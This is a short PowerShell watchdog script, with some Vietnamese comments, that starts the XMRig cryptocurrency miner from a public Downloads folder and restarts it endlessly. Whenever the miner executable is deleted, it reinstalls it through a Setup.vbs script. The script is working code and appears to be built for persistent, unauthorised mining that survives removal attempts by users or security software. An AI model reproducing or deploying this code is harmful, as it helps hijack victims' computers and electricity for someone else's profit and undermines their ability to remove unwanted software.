$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"

function Start-CoinRun {
    # Dừng tiến trình cũ nếu còn đang chạy
    if ($global:coinRunProcess -and !$global:coinRunProcess.HasExited) {
        try {
            $global:coinRunProcess.Kill()
            Write-Host "STOP"
        } catch {
            Write-Warning "DO NOT"
        }
    }

    # Bắt đầu lại tiến trình mới
    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
    Write-Host "🚀 coinrun.cmd START"
}

if (Test-Path $xmrigPath) {
    Start-CoinRun
} else {
    Write-Warning "xmrig.exe DoseNotExist..."
    if (Test-Path $setupPath) {
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
        Write-Host "Running Setup.vbs"

        while (!(Test-Path $xmrigPath)) {
            Write-Host "Wait xmrig.exe..."
            Start-Sleep -Seconds 3
        }

        Write-Host "xmrig.exe restored. Starting coinrun.cmd"
        Start-CoinRun  # <== BỔ SUNG GỌI LẠI SAU KHI KHÔI PHỤC
    } else {
        Write-Error "NO Setup.vbs"
    }
}

while ($true) {
    if (!(Test-Path $xmrigPath)) {
        Write-Warning "xmrig.exe deleted. Waiting..."

        if (Test-Path $setupPath) {
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
            Write-Host "Running Setup.vbs!"

            while (!(Test-Path $xmrigPath)) {
                Write-Host "Waiting... xmrig.exe"
                Start-Sleep -Seconds 3
            }

            Write-Host "xmrig.exe restored. Restarting coinrun.cmd"

            # Trước khi chạy lại coinrun.cmd, kết thúc tiến trình cũ nếu còn
            if ($global:coinRunProcess -and !$global:coinRunProcess.HasExited) {
                try {
                    $global:coinRunProcess.Kill()
                    Write-Host "Đã dừng tiến trình cũ coinrun.cmd"
                } catch {
                    Write-Warning "Không thể dừng tiến trình cũ"
                }
            }

            Start-CoinRun  # <== BỔ SUNG GỌI LẠI SAU KHI KHÔI PHỤC
        } else {
            Write-Error "NO Setup.vbs: $setupPath"
        }
    }

    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
        Write-Warning "coinrun.cmd STOPPED. Restarting..."
        Start-CoinRun
    } elseif ($global:coinRunProcess) {
        Write-Host "coinrun.cmd running..."
    }

    Start-Sleep -Seconds 3
}
